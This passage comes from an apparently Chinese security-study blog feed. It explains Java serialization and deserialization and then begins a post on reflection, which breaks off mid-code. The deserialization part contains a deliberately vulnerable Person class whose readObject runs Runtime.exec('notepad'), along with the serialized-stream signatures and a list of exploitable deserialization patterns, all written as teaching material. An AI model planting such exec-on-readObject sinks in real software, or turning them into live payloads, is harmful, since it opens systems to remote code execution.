      <url>/2023/10/17/java/base/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="Java反序列化原理"><a href="#Java反序列化原理" class="headerlink" title="Java反序列化原理"></a>Java反序列化原理</h2><h3 id="Serializable-接口的使用"><a href="#Serializable-接口的使用" class="headerlink" title="Serializable 接口的使用"></a>Serializable 接口的使用</h3><p>类需要被序列化和反序列化，需要实现接口 <code>java.io.Serializable</code></p><p>Java 提供的序列化接口 Serializable ，是一个空接口，没有成员方法和变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>序列化 调用 <code>ObjectOutputStream</code> 类的 <code>writeObject </code> 方法</p><p>反序列化 调用 <code>ObjectInputStream</code> 类的 <code>readObject </code> 方法</p></blockquote><p><strong>注意：</strong></p><blockquote><p>只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列，否则会抛出异常。Externalizable 接口继承自Serializable接口，实现 Externalizable接口的类完全由自身来控制序列化的行为，而仅实现 Serializable 接口的类可以采用默认的序列化方式。</p><ol><li>它是Java 提供的序列化接口，是一个空接口，没有成员方法和变量</li><li>一个类要想序列化就必须继承java.io.Serializable接口，同时它的子类也可以序列化（不用再继承Serializable接口）</li><li>一个实现Serializable 接口的子类也是可以被序列化的。在反序列化过程中，它的父类如果没有实现序列化接口，那么父类将需要提供无参构造函数来重新创建对象，这样做的目的是重新初始化父类的属性，父类对应的属性不会被序列化</li><li>序列化只能保存对象的非静态成员变量，不能保存任何的成员方法和静态的成员变量，而且序列化保存的只是变量的值，对于变量的任何修饰符都不能保存。即序列化是保存对象的状态（对象属性）</li><li>transient 标识的对象成员变量不参与序列化</li><li>Serializable 在序列化和反序列化过程中大量使用了反射，因此其过程会产生的大量的内存碎片</li></ol><p><strong>注：</strong>JAVA会被称为八股文，原因在于它的一个小知识点里会有很多细节在里面</p></blockquote><h4 id="Person"><a href="#Person" class="headerlink" title="Person"></a>Person</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.Seck2y.a01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 重写 toString，规定打印格式，不规定会输出类和地址</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>+</span><br><span class="line">                <span class="string">&quot;, age=&#x27;&quot;</span> + age + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 入口类的 readObject 直接调用危险方法，造成反序列化漏洞</span></span><br><span class="line"><span class="comment">// 运行反序列化操作，弹出记事本</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SerializableTest"><a href="#SerializableTest" class="headerlink" title="SerializableTest"></a>SerializableTest</h4><p>序列化 Person 形成 ser.txt文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.Seck2y.a01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos= <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">23</span>);</span><br><span class="line"><span class="comment">//        System.out.println(s);  打印输出以 toString方法 格式输出</span></span><br><span class="line">        serialize(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ser.txt</code> 乱码，这是必然的，因为java原生反序列化产生的就是字节序列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> sr net.Seck2y.a01.Person皰膭顿h� I ageL namet Ljava/lang/String;xp   t zhangsan</span><br></pre></td></tr></table></figure><p><strong>转16进制</strong></p><p>原生类16进制是以 aced00057372 开头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aced0005737200156e65742e5365636b32792e6130312e506572736f6eb092c484b6d968ce0200024900036167654c00046e616d657400124c6a6176612f6c616e672f537472696e673b7870000000177400087a68616e6773616e</span><br></pre></td></tr></table></figure><p><strong>转base64</strong></p><p>原生类base64是以 rO0ABXNy 开头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABVuZXQuU2VjazJ5LmEwMS5QZXJzb26wksSEttlozgIAAkkAA2FnZUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAABd0AAh6aGFuZ3Nhbg==</span><br></pre></td></tr></table></figure><h4 id="SerializationDumper"><a href="#SerializationDumper" class="headerlink" title="SerializationDumper"></a>SerializationDumper</h4><p>将序列化的16进制转码格式输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">D:\CTF\Web\Java\SerializationDumper-v1.13&gt;java -jar SerializationDumper-v1.13.jar &quot;aced0005737200156e65742e5365636b32792e6130312e506572736f6eb092c484b6d968ce0200024900036167654c00046e616d657400124c6a6176612f6c616e672f537472696e673b7870000000177400087a68616e6773616e&quot;</span><br><span class="line"></span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 21 - 0x00 15</span><br><span class="line">        Value - net.Seck2y.a01.Person - 0x6e65742e5365636b32792e6130312e506572736f6e</span><br><span class="line">      serialVersionUID - 0xb0 92 c4 84 b6 d9 68 ce</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 2 - 0x00 02</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - age - 0x616765</span><br><span class="line">        1:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 4 - 0x00 04</span><br><span class="line">            Value - name - 0x6e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      net.Seck2y.a01.Person</span><br><span class="line">        values</span><br><span class="line">          age</span><br><span class="line">            (int)23 - 0x00 00 00 17</span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 8 - 0x00 08</span><br><span class="line">                Value - zhangsan - 0x7a68616e6773616e</span><br></pre></td></tr></table></figure><h4 id="UnserializableTest"><a href="#UnserializableTest" class="headerlink" title="UnserializableTest"></a>UnserializableTest</h4><p>读取 ser.bin 文件 进行反序列化，再返回</p><p>但 readObject 已经被重写，便会执行重写的 readObject 终端运行命令打开 notepad</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.Seck2y.a01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializableTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">s</span> <span class="operator">=</span> (Person)unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(s);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><ol><li>只有实现了 <code>Serializable </code>或者 <code>Externalizable </code>接口的类的对象才能被序列化为字节序列，否则会抛出异常</li><li><code>Java.io.ObjectOutputStream</code>代表对象输出流，它的<code>writeObject(Object obj)</code>方法可对参数指定的 obj 对象进行序列化，把得到的字节序列写到一个目标输出流中</li><li><code>Java.io.ObjectInputStream</code>代表对象输入流，它的<code>readObject()</code>方法从一个源输 入流中读取字节序列，再把它们反序列化为一个对象，并将其返回</li><li>Java原生序列化的数据特征：16进制是以<code>aced00057372 </code>开头（一般认为是aced0005）；base64编码是以<code>rO0ABXNy</code>开头（一般认为是rO0AB）</li><li>反序列化产生漏洞的形式，有以下几种：</li></ol><ul><li>入口类的 readObject 直接调用危险方法</li><li>入口类参数中包含可控类，该类有危险方法，readObject 时调用</li><li>入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</li><li>构造函数&#x2F;静态代码块等类加载时隐式执行</li></ul><p><strong>Serializable接口的六个特点：</strong></p><ol><li><p>它是 Java 提供的序列化接口，是一个空接口，没有成员方法和变量</p></li><li><p>一个类要想序列化就必须继承 java.io.Serializable 接口，同时它的子类也可以序列化（不用再继承Serializable 接口）</p></li><li><p>一个实现 Serializable 接口的子类也是可以被序列化的</p></li><li><p>序列化只能保存对象的非静态成员变量</p></li><li><p>transient 标识的对象成员变量不参与序列化</p></li><li><p>Serializable 在序列化和反序列化过程中大量使用了反射</p></li></ol></blockquote><h3 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h3><p>反序列化时会检测 serialVersionUID 是否一致，不一致会导致异常</p><blockquote><p>serialVersionUID 发生改变有三种情况：</p><ol><li>手动去修改导致当前的 serialVersionUID 与序列化前的不一样</li><li>我们根本就没有手动去写这个 serialVersionUID 常量，那么 JVM 内部会根据类结构去计算得到这个 serialVersionUID 值，在类结构发生改变时(属性增加，删除或者类型修改了)这种也是会导致 serialVersionUID 发生变化</li><li>假如类结构没有发生改变，并且没有定义 serialVersionUID ，但是反序列和序列化操作的虚拟机不一样也可能导致计算出来的 serialVersionUID 不一样</li></ol><p>JVM 规范强烈建议我们手动声明一个版本号，这个数字可以是随机的，只要固定不变就可以。同时最好是 private 和 final 的，尽量保证不变</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射&amp;动态代理</title>
      <link href="/2023/10/13/java/base/Java%E5%8F%8D%E5%B0%84&amp;%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2023/10/13/java/base/Java%E5%8F%8D%E5%B0%84&amp;%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="Java反射-动态代理"><a href="#Java反射-动态代理" class="headerlink" title="Java反射&amp;动态代理"></a>Java反射&amp;动态代理</h2><h3 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h3><blockquote><p>Java 反射（Reflection）是一种机制，它允许 Java 程序在运行时获取和操作它本身的数据结构，比如类、方法、属性等。通过反射，我们可以动态地创建对象、调用方法、访问属性等，而无需在编译时知道这些信息。</p><p>Java 反射主要包括以下几个核心类：</p><ol><li>Class 类：表示一个类或接口，包含了获取类信息的方法，如获取类名、父类、接口、属性、方法等。</li><li>Constructor 类：表示一个构造函数，包含了获取构造函数信息的方法，如获取构造函数名、参数列表等。</li><li>Field 类：表示一个属性，包含了获取属性信息的方法，如获取属性名、类型、访问权限等。</li><li>Method 类：表示一个方法，包含了获取方法信息的方法，如获取方法名、参数列表、返回类型等。</li></ol><p>以下是一些 Java 反射的常见用法：</p><ol><li>获取类信息：通过 <code>Class.forName()</code> 方法获取某个类的 <code>Class</code> 对象，然后使用 <code>Class</code> 对象的各种方法获取类的信息，如 <code>getName()</code> 获取类名，<code>getDeclaredMethods()</code> 获取所有方法等。</li><li>创建对象：通过 <code>Class</code> 对象的 <code>getConstructor()</code> 或 <code>getDeclaredConstructor()</code> 方法获取指定构造函数的引用，然后使用 <code>newInstance()</code> 或 <code>newInstance()</code> 方法创建对象。</li><li>访问属性：通过 <code>Class</code> 对象的 <code>getDeclaredField()</code> 方法获取指定属性的引用，然后使用 <code>set()</code> 或 <code>get()</code> 方法设置或获取属性的值。</li><li>调用方法：通过 <code>Class</code> 对象的 <code>getDeclaredMethod()</code> 方法获取指定方法的引用，然后使用 <code>invoke()</code> 方法调用方法并传递参数。</li><li>动态代理：通过 Java 反射实现动态代理，可以在运行时创建一个实现了指定接口的代理类，并实现指定的方法逻辑。</li></ol></blockquote><p><code>Class</code>类就是通过<code>Field</code>和<code>Method</code>来描述类中的字段和方法</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p><strong>Person 类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.Seck2y.a02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String string)</span>&#123;</span><br><span class="line">        System.out.println(string);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写 toString，规定打印格式，不规定会输出 类 和 地址</span></span><br><span class="line">    <span class="meta">@Override</span>    </span><br><span class="line">    <span class="keyword">public</span>  String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;name: &quot;</span> + <span class="built_in">this</span>.name +</span><br><span class="line">            <span class="string">&quot;, age: &quot;</span>+ <span class="built_in">this</span>.age +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Reflection 类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.Seck2y.a02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Class&lt;?&gt;</span></span><br><span class="line">        <span class="comment">// 获取 Person 类的 Class 对象（两种形式）</span></span><br><span class="line">        <span class="comment">// Class&lt;?&gt; personClass = Person.class;</span></span><br><span class="line">        Class&lt;?&gt; personClass = Class.forName(<span class="string">&quot;net.Seck2y.a02.Person&quot;</span>);  <span class="comment">// 完整路径</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Constructor&lt;?&gt;</span></span><br><span class="line">        <span class="comment">// 获取 Person 类的构造方法</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = personClass.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 Person 对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">person</span> <span class="operator">=</span> constructor.newInstance(<span class="string">&quot;lisi&quot;</span>, <span class="number">24</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        <span class="comment">// 输出 Person&#123;name: lisi, age: 24&#125;</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Field</span></span><br><span class="line">        <span class="comment">// 获取成员属性的信息（无值）</span></span><br><span class="line">        Field[] personField = personClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field f:personField)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 输出 </span></span><br><span class="line"><span class="comment">        private java.lang.String net.Seck2y.a02.Person.name</span></span><br><span class="line"><span class="comment">        private int net.Seck2y.a02.Person.age</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取成员属性的值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  <span class="comment">// 提权</span></span><br><span class="line">        ageField.setAccessible(<span class="literal">true</span>);   <span class="comment">// 提权</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) nameField.get(person);  <span class="comment">// 获取 nameField 属性的值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> (<span class="type">int</span>) ageField.get(person);          <span class="comment">// 获取 ageField 属性的值</span></span><br><span class="line">        System.out.println(</span><br><span class="line">            nameField.getName() + <span class="string">&quot;: &quot;</span> + name + <span class="string">&quot;, &quot;</span> + </span><br><span class="line">            ageField.getName() + <span class="string">&quot;: &quot;</span> + age);  </span><br><span class="line">        <span class="comment">// getName 获取属性的名称</span></span><br><span class="line">        <span class="comment">// System.out.println(person);  可替换</span></span><br><span class="line">        <span class="comment">// 输出 name: lisi, age: 24</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 修改成员属性的值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">setName</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">setAge</span> <span class="operator">=</span> personClass.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        setName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        setAge.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        setName.set(person, <span class="string">&quot;wangwu&quot;</span>);</span><br><span class="line">        setAge.set(person, <span class="number">25</span>);</span><br><span class="line">        System.out.println(</span><br><span class="line">            setName.getName() + <span class="string">&quot;: &quot;</span> +setName.get(person) + <span class="string">&quot;, &quot;</span> + </span><br><span class="line">            setAge.getName() + <span class="string">&quot;: &quot;</span> + setAge.get(person));</span><br><span class="line">        <span class="comment">// System.out.println(person);  可替换</span></span><br><span class="line">        <span class="comment">// 输出 name: wangwu, age: 25</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Method</span></span><br><span class="line">        <span class="comment">// 获取方法</span></span><br><span class="line">        Method[] personMethod = personClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method m: personMethod) &#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 输出</span></span><br><span class="line"><span class="comment">         public java.lang.String net.Seck2y.a02.Person.toString()</span></span><br><span class="line"><span class="comment">         public void net.Seck2y.a02.Person.action(java.lang.String)</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取 Person 对象的方法信息并调用它们</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionMethod</span> <span class="operator">=</span> 